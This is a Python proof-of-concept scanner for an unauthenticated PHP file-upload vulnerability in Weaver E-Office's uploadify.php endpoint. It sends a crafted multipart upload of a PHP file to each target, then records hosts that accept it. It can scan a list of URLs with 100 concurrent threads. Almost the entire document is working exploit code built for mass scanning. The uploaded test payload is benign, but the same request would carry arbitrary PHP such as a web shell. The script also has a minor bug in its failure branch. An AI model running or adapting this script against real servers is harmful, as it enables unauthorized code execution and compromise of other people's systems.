
#导包
import requests,re,json,argparse,sys
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """ 
            ______       ____   __  __ _                        _                 _ _  __               _           
 |  ____|     / __ \ / _|/ _(_)                      | |               | (_)/ _|             | |          
 | |__ ______| |  | | |_| |_ _  ___ ___   _   _ _ __ | | ___   __ _  __| |_| |_ _   _   _ __ | |__  _ __  
 |  __|______| |  | |  _|  _| |/ __/ _ \ | | | | '_ \| |/ _ \ / _` |/ _` | |  _| | | | | '_ \| '_ \| '_ \ 
 | |____     | |__| | | | | | | (_|  __/ | |_| | |_) | | (_) | (_| | (_| | | | | |_| |_| |_) | | | | |_) |
 |______|     \____/|_| |_| |_|\___\___|  \__,_| .__/|_|\___/ \__,_|\__,_|_|_|  \__, (_) .__/|_| |_| .__/ 
                                               | |                               __/ | | |         | |    
                                               |_|                              |___/  |_|         |_|    

                          
"""
    print(test)
#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="泛微E-Office uploadify.php后台文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




#poc函数
def poc(target):
    payload = '/inc/jquery/uploadify/uploadify.php'
    headers = {
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_14_3)AppleWebKit/605.1.15(KHTML,likeGecko)Version/12.0.3Safari/605.1.15',
        'Content-Length':'227',
        'Accept-Encoding':'gzip,deflate',
        'Connection':'close',
        'Content-Type':'multipart/form-data;boundary=gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s',
            }
    data = '--gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s\nContent-Disposition: form-data; name="Filedata"; filename="test14.php"\nContent-Type: application/octet-stream\n\n<?php echo 123;?>\n\n--gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s--'
    try:
        res = requests.post(url=target + payload,verify=False,headers=headers,data=data)
        #print(type(res.text))
        if len(res.text) ==10:
            with open('result1.txt','a',encoding='utf -8') as f:
                f.write(f'[+]{target}存在漏洞 \n')
                print(f'[+]{target}存在漏洞 \n')
        else:
            f.write(f'[-]{target}不存在漏洞 \n')


       
        
    except:
        pass
    
    
#函数入口
if __name__ == '__main__':
    main()
